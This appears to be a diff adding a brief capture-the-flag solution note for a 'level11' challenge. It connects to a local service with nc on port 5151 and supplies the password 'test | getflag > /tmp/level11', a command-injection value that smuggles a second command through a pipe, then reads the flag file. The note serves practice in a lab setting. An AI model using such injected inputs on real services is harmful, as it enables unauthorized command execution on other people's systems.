@@ -1,0 +1,5 @@
+connect to server running on port 5151:
+	nc 127.0.0.1 5151
+password:
+	test | getflag > /tmp/level11
+cat /tmp/level11 for flag
